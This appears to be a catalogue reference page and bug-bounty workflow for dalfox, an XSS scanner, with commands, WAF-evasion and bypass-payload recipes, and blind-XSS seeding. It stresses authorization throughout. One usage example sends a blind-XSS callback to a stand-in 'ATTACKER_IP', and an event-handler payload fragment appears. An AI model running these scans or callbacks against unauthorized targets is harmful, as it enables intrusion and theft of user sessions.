---
name: "dalfox"
categories:
  - blackarch-webapp
version: "v3.2.4.r34.g1eb8c95"
homepage: "https://github.com/hahwul/dalfox"
packaged-by: [blackarch, aur, nixpkgs]
blackarch-builddate: "2026-10-31"
build-system: go
license: MIT
meta-checked: "2026-11-09"
github-repo: "hahwul/dalfox"
github-stars: 5356
github-pushed: "2026-11-07"
github-archived: false
github-issues: 11
github-match: "exact"
gh-checked: "2026-11-07"
worth: 8.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
last-refresh: "2026-11-19"
github-commits-year: 1037
gh-activity-checked: "2026-11-09"
---

# dalfox

> Automation-focused XSS scanner and parameter analyzer, written in Rust.

## What it's for

Dalfox scans for cross-site scripting: it mines and analyzes a target's parameters, then tests reflected, stored and DOM-based XSS with static analysis and DOM/AST verification, and can fingerprint WAFs. Input is a URL, a file of URLs, stdin, a raw HTTP request or a HAR file (auto-detected by `scan`); blind XSS callbacks, custom payload files and multiple report formats (including JSON and SARIF) are supported. Since v3 the tool is a Rust rewrite; the older Go codebase is preserved on the v2 branch. Subcommands: `scan`, `server` (REST API), `payload`, `mcp`.

## Typical use cases

### Scan a single URL

```
dalfox scan https://example.com/?q=test
```

Outcome: analyzes the target's parameters and runs the XSS test pipeline, printing each finding with the vulnerable parameter, the payload and the evidence.

### Scan a list of URLs from a file or pipe

```
cat urls.txt | dalfox scan --headers "AuthToken: xxx"
```

Outcome: scans every URL fed on stdin with the given header added to all requests — the standard batch mode for large target lists (file mode `dalfox scan urls.txt` behaves the same).

### Test with your own payloads

```
dalfox scan urls.txt --custom-payload mypayloads.txt
```

Outcome: replaces the built-in payload set with the file's entries — the form to use for context-specific or WAF-tuned payloads.

### Pin a custom injection point

```
dalfox scan 'https://example.com/?q=FUZZ&page=1' --inject-marker FUZZ
```

Outcome: skips parameter discovery and tests exactly where the FUZZ marker sits, in the query or in a header (`dalfox scan https://example.com -H 'X-Search: FUZZ' --inject-marker FUZZ`).

### Catch blind XSS

```
dalfox scan https://example.com -b https://ATTACKER_IP
```

Outcome: injects payloads that call home to the given callback URL, alerting when the injected JavaScript finally executes in a victim browser.

### Serve scans over a REST API

```
dalfox server
```

Outcome: starts dalfox's server mode, exposing scans through a REST API for programmatic callers.

## Bug bounty workflow with dalfox

Dalfox is not a crawler and not a one-command auto-pwn. It is an **XSS testing engine**: you hand it parameterized URLs (or a raw request), it mines parameters, injects a payload set, and classifies what reflects. The yield on a program depends almost entirely on the quality of the URL corpus you feed it and on the discipline you apply to volume — the default `--workers 50` with no rate cap will spray a host hard enough to get you throttled or removed. Work the phases below in order on a fresh target; everything assumes written authorization and the program's rules of engagement.

A detail that reshapes the whole workflow, verified against the v3 detection-model docs: **dalfox v3 drives no browser and speaks no CDP — it never renders a page or watches an `alert()` fire.** Request-based detection parses the DOM tree out of the real HTTP response and checks whether the payload landed in an executable position (static analysis on parsed HTML, stronger than a raw string match, but still not execution). The *only* method that observes real execution is the out-of-band blind callback (`--blind-oob`). This means pure client-side DOM XSS — where JavaScript writes the payload into a sink at runtime — is **not** confirmable by dalfox's response parsing; those you confirm by hand in a browser with devtools. Treat dalfox's output as a ranked lead list, not a stack of pre-proven bugs.

### Phase 0 — Authorization, scope, and callback infrastructure

Before a single payload goes out:

- **Confirm XSS is in scope and in-band automated scanning is permitted.** Some programs forbid automated scanners outright or cap request rate. Dalfox is unambiguously an automated scanner; if the program bans them, stop here.
- **Decide your blind-XSS infrastructure.** `-b https://xss.your-collab.example` fires at a listener you own and control (self-hosted Collaborator, interactsh server, or a simple logging endpoint). `--blind-oob` uses interactsh and **defaults to the public interactsh mesh** — dalfox registers with it and polls it for you. For bug bounty, prefer your own listener: client/target data that reaches a third-party OAST server has left your control (see Pitfalls). Never point a blind callback at a domain you do not own.
- **Set your rate budget from the program's rules, not dalfox's defaults.** Plan the `--workers`, `--rate-limit`/`-r`, `--delay`, and `--max-targets-per-host` values you will use everywhere (Phase 3).
- **Record a baseline.** Decide where output goes: `-o findings.json -f json` (or `-f sarif` for pipelines), and whether you need `--include-request`/`--include-response` for evidence (they embed cookies and headers — handle with care).

### Phase 1 — Build the parameterized URL corpus (passive first)

Dalfox tests parameters, so it needs URLs that *have* parameters. Build that list with passive/low-touch tooling before dalfox ever sends a payload:

```bash
# passive URL mining — no payloads sent to the target yet
gau   example.com                     > urls.raw     # Wayback/CommonCrawl/OTX archives
# or: waybackurls example.com, or katana -silent for a light active crawl

# keep only URLs that carry query parameters, then XSS-relevant ones, then dedupe
gf xss < urls.raw | uro > urls.xss     # gf 'xss' pattern + uro near-dup collapse
wc -l urls.xss
```

`subfinder -d example.com | httpx -silent` gives you *live hosts*, not parameters — it is the front of the pipeline (which hosts are up and in scope), feeding `gau`/`katana` per host, not dalfox directly. Feed dalfox the parameterized output, and let its own de-duplication cut redundant work (Phase 3, `--dedup-urls signature`).

### Phase 2 — Parameter discovery and mining

For endpoints where archives did not reveal the parameters, let dalfox mine them. It mines from a built-in dictionary (`--skip-mining-dict` to disable), from DOM-observed names (`--skip-mining-dom` to disable), and optionally from a remote wordlist:

```bash
# add names from a hosted wordlist; add your own with -W
dalfox scan 'https://example.com/search' \
  --remote-wordlists burp,assetnote \
  -W extra-params.txt \
  --only-discovery            # discover reflections/params, do not run the XSS payload set yet
```

`--only-discovery` is the program-safe reconnaissance pass: it finds reflected parameters and candidate injection points without firing the payload battery. `--skip-mining` turns mining off entirely when you already have the exact parameters and want minimum traffic.

### Phase 3 — Low-volume reflected/DOM scan

Now the payload set, under a strict rate budget. The single most important habit: **cap concurrency and rate before touching a real program's host.**

```bash
cat urls.xss | dalfox scan \
  --workers 10 \                 # default is 50; drop it hard for a live program
  --rate-limit 10 \              # global requests/sec cap (alias --rl, -r)
  --delay 100 \                  # ms pause per worker between requests
  --max-targets-per-host 20 \    # don't pile every URL of one host at once
  --dedup-urls signature \       # collapse URLs differing only in param values
  --ignore-return 404,403 \      # don't chase dead/blocked responses
  -o run.json -f json
```

`--dedup-urls signature` is the scale lever: a thousand archived `?id=1`, `?id=2`, … URLs collapse to one scan signature, so you test the *shape* once instead of a thousand times. Add `--deep-scan` only on a short, high-value list — it broadens payload/parameter coverage and multiplies requests. Encoder selection (`-e url,html` by default; `--encoders base64,unicode,zwsp,…`) and WAF handling come next if responses look filtered (Phase 3b).

### Phase 3b — When a WAF is in the way

Dalfox probes for a WAF and adapts. The v3 flags (verified): `--waf-bypass auto|off|force` (default `auto`), `--waf-evasion` (slows/alters requests to evade rate-based WAF rules), `--skip-waf-probe`, `--force-waf <name>` (e.g. `cloudflare`, `akamai`, `imperva`, `modsecurity`), and `--waf-min-confidence` (default `0.3`). When the built-in set is filtered, supply your own:

```bash
dalfox scan 'https://example.com/?q=FUZZ' --inject-marker FUZZ \
  --custom-payload waf-tuned.txt --only-custom-payload \
  --encoders 2url,html,unicode \
  --waf-evasion --delay 250
```

`--only-custom-payload` *requires* `--custom-payload` (else exit code 2) and replaces the built-in battery with your file alone — the right tool for a context-specific or hand-crafted bypass set.

### Phase 4 — Blind (stored) XSS seeding

Stored XSS is where `--sxss` and the blind callback earn their keep. Seed every writable field (profile name, support ticket, comment, filename) with a payload that phones home, then wait for an admin or another user to render it:

```bash
# fire at YOUR OWN listener; dalfox records no finding for plain -b, you watch your listener
dalfox scan 'https://example.com/profile' -X POST -d 'bio=FUZZ' --inject-marker FUZZ \
  -b https://xss.your-collab.example

# stored-XSS verification mode: inject at one URL, check for execution at another
dalfox scan 'https://example.com/support/new' -d 'msg=FUZZ' --inject-marker FUZZ \
  --sxss --sxss-url 'https://example.com/admin/tickets' --sxss-method GET

# OOB via interactsh; --blind-oob-secret authenticates a self-hosted server,
# --blind-oob-wait keeps polling N seconds after the last payload is sent
dalfox scan urls.xss --blind-oob=oast.your-server.example \
  --blind-oob-secret "$OAST_TOKEN" --blind-oob-wait 60
```

Note the asymmetry: a plain `-b` callback produces **no dalfox finding** — the hit shows up in *your* listener's logs, so you must be watching it. `--blind-oob` is the mode where dalfox itself registers, polls, and reports the callback as a `V`/`oob` finding.

### Phase 5 — Verify and triage (understand V vs R)

Dalfox tags each finding; the type tells you how much work remains:

| Tag | Name | What it means for you |
|---|---|---|
| `V` | Vulnerable | Dalfox asserts an executable position was confirmed (dom-verification, reflection into an executable spot, or an OOB callback). Strongest lead — still reproduce it yourself. |
| `R` | Reflected | Payload came back but its position was not confirmed exploitable. A signal to confirm by hand, not a bug yet. |
| `A` | AST-detected | Transitional method label, being folded into the tier model. |
| `I` | Informational | Not an XSS claim (e.g. a known-vulnerable JS library, CWE-1104 via `--detect-outdated-libs`). |

Two cautions straight from the docs: the tier and the confidence grade can disagree during the v3 transition (you may see `type=V, confidence=low` — the preview signal, not a bug), and **pure client-side DOM XSS is not detected by response parsing** — for those, open the generated PoC URL in a browser with devtools and confirm execution manually. Promote only what you can reproduce by hand to a report.

### Phase 6 — Single-target deep-dive from a Burp request

For one interesting endpoint, drive dalfox from a captured raw request so headers, cookies, method, and body match the authenticated session exactly:

```bash
# save the Burp request to request.txt, mark the injection point with your marker
dalfox scan -i raw-http request.txt --inject-marker FUZZ \
  --cookie-from-raw request.txt \
  --workers 5 --delay 200 -f json -o one-endpoint.json
```

`-i raw-http` parses method, path, headers, and body from the file (there is **no** `--rawdata`/`-r`-for-raw flag — `-r` is `--rate-limit`). `--cookie-from-raw` loads the cookie jar from that same file. This is the mode for testing a deep, authenticated, parameter-rich endpoint at minimal volume.

### Phase 7 — Scaling across a whole program without a ban

Pipeline shape for a large multi-host program, with the courtesy controls that keep it from reading as an attack:

```bash
# 1. live, in-scope hosts
subfinder -d example.com -silent | httpx -silent -mc 200,301,302,401,403 > hosts.txt

# 2. per-host URL corpus (archives + a light crawl), parameters only, deduped
while read -r h; do gau "$h"; katana -u "$h" -silent -d 2; done < hosts.txt \
  | gf xss | uro > urls.xss

# 3. one dalfox run, scoped, rate-capped, resumable, machine-readable
cat urls.xss | dalfox scan \
  --include-url 'https?://([a-z0-9-]+\.)?example\.com/' \
  --out-of-scope-file out-of-scope.txt \
  --dedup-urls signature \
  --workers 10 --rate-limit 10 --delay 100 --max-targets-per-host 20 \
  --state-file program.state \
  --stream-findings -o program.json -f json
```

Three habits make this sustainable: `--dedup-urls signature` so a 50k-URL corpus tests shapes, not duplicates; `--max-targets-per-host 20` so no single origin is hammered even when the list is host-skewed; and `--state-file` so you can spread the run over several courteous windows and resume without re-testing. `--stream-findings` writes results as they land, so a run you have to stop early still leaves usable output. For triage at scale, the `mcp` subcommand exposes dalfox to an agent — useful for sorting `V`/`R`/`A`/`I` output, but remember the data-handling caveat in Pitfalls (output goes to whatever model drives it).

## Where the money is with dalfox

Priority by payout and how dalfox reaches each class. "Dupe risk" reflects how heavily the surface is already auto-scanned by others.

| Priority | Finding class | How dalfox reaches it | Typical severity | Dupe risk |
|---|---|---|---|---|
| 1 | Stored/blind XSS in an admin or cross-user context | `--sxss` + `--sxss-url`, or `-b`/`--blind-oob` seeded into writable fields | High–Critical | Low — needs the right field + a victim render; few hunters wait for the callback |
| 2 | Reflected XSS in an authenticated flow | raw-request mode (`-i raw-http`) with real session cookies | Medium–High | Medium |
| 3 | Reflected XSS on a parameter archives missed | `--only-discovery` → mining (`--remote-wordlists`, `-W`) then scan | Medium | Medium–High |
| 4 | Reflected XSS behind a WAF | `--waf-evasion`, `--encoders`, `--custom-payload --only-custom-payload` | Medium–High | Low — most scanners give up at the WAF |
| 5 | DOM XSS (client-side sink) | dalfox flags the lead (`R`/`A`); **you** confirm in a browser | Medium–High | Medium |
| 6 | Reflected XSS on a bare query param (mass surface) | `cat urls.xss \| dalfox scan` with `--dedup-urls signature` | Low–Medium | **High** — everyone sprays this; expect dupes |
| 7 | Outdated vulnerable JS library | `--detect-outdated-libs` (reported as `I`) | Low–Info | High |

The economically interesting rows are 1, 2, and 4: stored/blind in a real cross-user context, reflected inside an authenticated session, and anything a WAF scared other hunters off. The mass reflected-param spray (row 6) is where dupes and bans both live.

## Command recipes

Each block pairs a real command with what you should see. Low-volume settings are called out inline.

```bash
# 1) PASSIVE discovery only — find reflected params, send no XSS payloads
dalfox scan 'https://example.com/search?q=test' --only-discovery -f json
# -> JSON listing reflected parameters and candidate injection points; no payload battery fired
```

```bash
# 2) Rate-capped batch scan of a vetted list (the program-safe default shape)
cat urls.xss | dalfox scan --workers 10 --rate-limit 10 --delay 100 \
  --max-targets-per-host 20 --dedup-urls signature --ignore-return 404,403 \
  -o run.json -f json
# -> stream of findings tagged V/R/A/I; signature-dedup keeps a huge list from becoming a flood
```

```bash
# 3) Pin the injection point, skip mining entirely (minimum traffic)
dalfox scan 'https://example.com/p?id=1&q=FUZZ' --inject-marker FUZZ --skip-mining
# -> tests only where FUZZ sits; no parameter discovery traffic at all
```

```bash
# 4) Header / cookie injection point
dalfox scan https://example.com -H 'X-Forwarded-Host: FUZZ' --inject-marker FUZZ
# -> injects into the named header rather than a query parameter
```

```bash
# 5) Custom WAF-bypass payloads only, with evasion and a slow cadence
dalfox scan 'https://example.com/?s=FUZZ' --inject-marker FUZZ \
  --custom-payload bypass.txt --only-custom-payload \
  --encoders 2url,unicode,html --waf-evasion --delay 250 --workers 5
# -> built-in battery replaced by bypass.txt; omitting --custom-payload here exits code 2
```

```bash
# 6) Hosted payload sets (PortSwigger / PayloadBox cheat sheets)
dalfox scan urls.xss --remote-payloads portswigger,payloadbox --workers 10 --rate-limit 10
# -> fetches the lists once per run (honors --proxy/--timeout), then tests with them
```

```bash
# 7) Blind XSS to YOUR listener (watch your own logs — no dalfox finding for plain -b)
dalfox scan 'https://example.com/contact' -d 'message=FUZZ' --inject-marker FUZZ \
  -b https://xss.your-collab.example --workers 5 --delay 200
```

```bash
# 8) Inspect the payload corpus without touching any target
dalfox payload --json                       # dump everything as JSON
dalfox payload event-handlers               # just the event-handler set
dalfox payload dom-clobbering               # DOM-clobbering gadgets
# selectors: javascript, event-handlers, useful-tags, uri-scheme, special-chars,
#            functions, awesome-alert, dom-clobbering, mxss, blind, portswigger, payloadbox, all
```

```bash
# 9) Enforce TLS verification (v3 defaults to --insecure=true, which SKIPS cert checks)
dalfox scan https://example.com/?q=test --insecure=false
# -> use this on any program where you must not ignore a bad/MITM certificate
```

```bash
# 10) CI/pipeline gate — fail only on high-confidence findings, emit SARIF
dalfox scan urls.xss --fail-on high --min-confidence high -f sarif -o dalfox.sarif
# exit codes: 0 = no findings, 1 = findings, 2 = input/config/runtime error
```

```bash
# 11) Pre-flight: see what WOULD be sent without sending any payload
dalfox scan urls.xss --dry-run
# -> enumerates the planned targets/injection points; the safest first look at a new list
```

Rate knobs, summarized: `--workers` (default **50**, range 1–500 — lower it for live programs), `--rate-limit`/`-r`/`--rl` (global req/s, default 0 = uncapped), `--delay` (ms per worker, default 0), `--max-targets-per-host` (default 100), `--max-concurrent-targets` (default 50), `--timeout` (10s per request), `--scan-timeout` (0 = none, per target). The defaults are tuned for throughput on your own lab, not for courtesy on someone else's production host.

## Input sources and scope control

Dalfox's `scan` auto-detects its input (`-i auto`), but for bug bounty the explicit input types and the scope flags are what keep a run inside the rules of engagement.

### Input types (`-i` / `--input-type`)

```bash
dalfox scan urls.txt                       # -i auto detects a file of URLs
cat urls.txt | dalfox scan                 # -i auto detects stdin (pipe)
dalfox scan -i raw-http request.txt        # a Burp/ZAP raw request (Phase 6)
dalfox scan -i har session.har             # a browser HAR export — tests the params you actually exercised
dalfox scan -i openapi api.json --base-url https://example.com   # an OpenAPI/Swagger spec
dalfox scan -i postman collection.json --base-url https://example.com  # a Postman collection
```

The HAR and OpenAPI/Postman inputs are underused and high-value: a HAR captured while you drive the app in a browser carries the exact authenticated, parameterized requests the app expects, and `--base-url` lets a spec drive the host while the paths/params come from the contract. These beat archive dumps for authenticated surfaces and produce far less off-target noise.

### Keeping the run inside program scope

| Flag | Purpose |
|---|---|
| `--include-url <regex>` | only scan URLs matching the regex (repeatable) |
| `--exclude-url <regex>` | drop URLs matching the regex, e.g. logout/delete/billing endpoints (repeatable) |
| `--out-of-scope <host>` / `--out-of-scope-file <file>` | host patterns to never touch — the program's out-of-scope list goes here |
| `--ignore-param <name>` | never inject a given parameter (e.g. `csrf_token`, `_method`) (repeatable) |
| `--ignore-return 404,403,…` | don't chase dead or blocked responses |

```bash
# scope a mixed archive dump to one in-scope host family, skip destructive paths
cat urls.raw | dalfox scan \
  --include-url 'https?://([a-z0-9-]+\.)?example\.com/' \
  --exclude-url '/(logout|delete|billing|unsubscribe)' \
  --out-of-scope-file out-of-scope.txt \
  --ignore-param csrf_token \
  --workers 10 --rate-limit 10 --dedup-urls signature
```

`--exclude-url` on destructive verbs/paths is not optional courtesy — firing an XSS battery at `/account/delete` or `/invite/send` can trigger real side effects and blow your scope. Build the exclude list before the run.

### Authenticated scans: don't keep firing after logout

Long authenticated runs lose their session partway through and then spray hundreds of unauthenticated requests that are pure noise. Guard against it:

```bash
dalfox scan urls.xss -H "Cookie: session=$SESSION" \
  --session-check --session-check-url 'https://example.com/account' \
  --on-session-loss abort \
  --state-file run.state           # resume a long run without re-testing completed targets
```

`--session-check` with `--session-check-url` validates the session is still live; `--on-session-loss abort` stops the run the moment it drops (vs `continue`). `--state-file` records completed targets so an interrupted or resumed run skips what it already covered — essential for large lists you must spread over a courteous time window.

### What dalfox is actually matching

Request-based detection classifies where your marker landed in the parsed response, which is why the same payload behaves differently per context. Knowing the context tells you whether an `R` is likely promotable:

| Reflection context | What makes it executable | dalfox signal |
|---|---|---|
| HTML element body | a real tag/event breaks out (`<img src=x onerror=…>`) | `V`+dom-verification when the node parses as an element |
| HTML attribute value | quote-break + new attribute/handler | `V` if the marker lands in a dangerous attribute position |
| URL/`href`/`src` attribute | an executable scheme (`javascript:`) in a dangerous attribute | `V` on a confirmed scheme |
| JS string / inline script | breaking the string/context | often `R` — hard to statically confirm, verify by hand |
| Client-side DOM sink | JS writes the marker at runtime | **not** caught by response parsing — browser-confirm |

This is also why `--encoders` matters: the same payload may need `url`, `2url` (double), `html`, `unicode`, or `zwsp` encoding to survive the transport into a given context intact.

## Pitfalls, noise and scope discipline

**Mass XSS spraying gets you throttled, blocked, or removed.** The number-one way hunters burn a program with dalfox is piping an enormous archive dump straight into `dalfox scan` at the default 50 workers with no rate cap. Each parameter expands into dozens of payloads × encoder variants, so a few thousand URLs becomes hundreds of thousands of requests against one origin in minutes — indistinguishable from an attack, and often a rules-of-engagement violation on its own. Always `--dedup-urls signature`, always cap `--workers`/`--rate-limit`/`--max-targets-per-host`, and scope the list to the program first.

**`--deep-scan` and `--max-payloads-per-param` multiply volume.** `--deep-scan` broadens coverage (more parameters, more payloads); reserve it for short, high-value lists. If you must bound a run, `--max-payloads-per-param N` caps the battery per parameter.

**`--insecure` defaults to `true`.** v3 skips TLS certificate validation unless you pass `--insecure=false`. On a program where certificate trust matters (or where a transparent proxy could tamper with traffic), set it explicitly.

**`R` is not a bug; `V`/client-side DOM needs human confirmation.** Reporting raw `R` findings, or `V` findings you never reproduced, is how hunters get a reputation for noise and get auto-rejected. Dalfox does not run a browser — for client-side DOM sinks, open the PoC URL with devtools and confirm `alert`/sink execution before writing anything up.

**Blind callbacks to someone else's infrastructure leak target data.** The default `--blind-oob` public interactsh mesh means a third party's server sees your callbacks — which can include the victim's/target's own request context when the payload fires. For bug bounty, prefer `-b` with a listener you own, or `--blind-oob=<your-server>` with `--blind-oob-secret`. This is the real "never leak client data to a third-party service" rule — dalfox has **no** SaaS/cloud/telemetry mode that phones your scan data home, but several features *can* move data off your box if you let them:

- `--remote-payloads` / `--remote-wordlists` fetch lists from external hosts (honoring `--proxy`/`--timeout`); the docs do not spell out exactly what each request carries, so route them through your proxy if you care.
- The `server` REST API binds to `127.0.0.1:6664` by default and accepts **unauthenticated** requests when no `--api-key` (or `DALFOX_API_KEY`) is set; it warns when bound to a non-loopback address without a key. Its optional `callback_url` POSTs the full result JSON wherever you point it, and `--log-file` records every submitted target URL. Never expose it publicly, and never POST findings to a host you do not control.
- `mcp` mode hands scan output to whatever model/agent drives it (its tools are marked `openWorldHint: true` for reaching third-party hosts). If that model is a hosted provider, your findings and target-quoted text go there. MCP deliberately omits `callback_url`; keep it that way.

**`-H` means different things per subcommand.** On `scan`, `-H`/`--headers` sets request headers (repeatable). On `server`, `-H`/`--host` is the bind address. Don't copy a `-H` across subcommands blindly.

**Flag names changed in the v3 (Rust) rewrite.** If you're porting v2 muscle memory: there is no `--worker-conc` (it's `--workers`), no `--rawdata` (it's `-i raw-http`), no `--mining-dict` (it's `-W`/`--mining-dict-word`), no `--deep-domxss` (it's `--deep-scan`), no `--skip-bav`, and `-r` is `--rate-limit`, not a raw-request flag. The old `url`/`file`/`pipe` subcommands still exist but are hidden; new scripts should use `scan` (the default) with `-i`.

## Reporting evidence

What to capture so a triager can reproduce without re-running your tooling:

- **The exact command and dalfox version** (`dalfox -V` → v3.3.x), with the rate flags you used — it shows you tested responsibly.
- **The machine-readable finding.** `-o finding.json -f json` (or `-f sarif`). Include the finding **type** (`V`/`R`/`A`/`I`) and confidence; do not silently upgrade an `R` to "confirmed XSS".
- **A copy-pasteable PoC.** Use `--poc-type curl` (or `http-request`/`httpie`) so the report carries a ready request. For reflected/DOM, include the single PoC URL that triggers it.
- **The request/response pair**, captured deliberately: `--include-request`/`--include-response` (or `--include-all`) embed them in the output — but they also embed the **whole cookie jar and every `-H` header**, so sanitize before sharing (strip session cookies, auth tokens, and your own callback secrets).
- **Browser proof for execution.** Since dalfox does not render pages, attach a screenshot of the `alert()`/sink firing in a browser for reflected and especially client-side DOM findings — that screenshot, plus the PoC URL, is the reportable evidence, not the scanner line alone.
- **Blind/stored XSS:** the injected payload, the field it was stored in, and the callback hit from *your* listener (timestamp, source IP, the context that rendered it). For `--blind-oob`, the interactsh interaction record.
- **Impact framing.** Reflected XSS requiring a crafted link is Medium-ish; stored XSS executing in another user's or an admin's session is High–Critical — say which, and who the victim is.

## References

- dalfox GitHub repository (README, v3 Rust rewrite, subcommands) — https://github.com/hahwul/dalfox
- dalfox CLI reference (all `scan`/`server`/`payload`/`mcp` flags, v3.3.0) — https://dalfox.hahwul.com/reference/cli/
- dalfox detection model (V/R/A/I types; "drives no browser", dom-verification vs reflection, OOB as the only execution observation) — https://dalfox.hahwul.com/guide/detection-model/
- dalfox payloads guide (`--custom-payload`, `--remote-payloads`, `--custom-blind-xss-payload`, remote-fetch behavior) — https://dalfox.hahwul.com/guide/payloads/
- dalfox output guide (`-f` formats, `--poc-type`, `--include-request/-response` cautions) — https://dalfox.hahwul.com/guide/output/
- dalfox server integration (bind default, `--api-key`, `callback_url`, `--log-file` warnings) — https://dalfox.hahwul.com/integrations/server/
- dalfox MCP integration (`openWorldHint`, output handed to a model, no `callback_url`) — https://dalfox.hahwul.com/integrations/mcp/

*Research supplement added 2026-11-15, grounded in the dalfox GitHub README and the official docs at dalfox.hahwul.com (CLI reference, detection-model, payloads, output, server, and MCP guides), verified against v3.3.0 (model: claude-opus-4-8).*
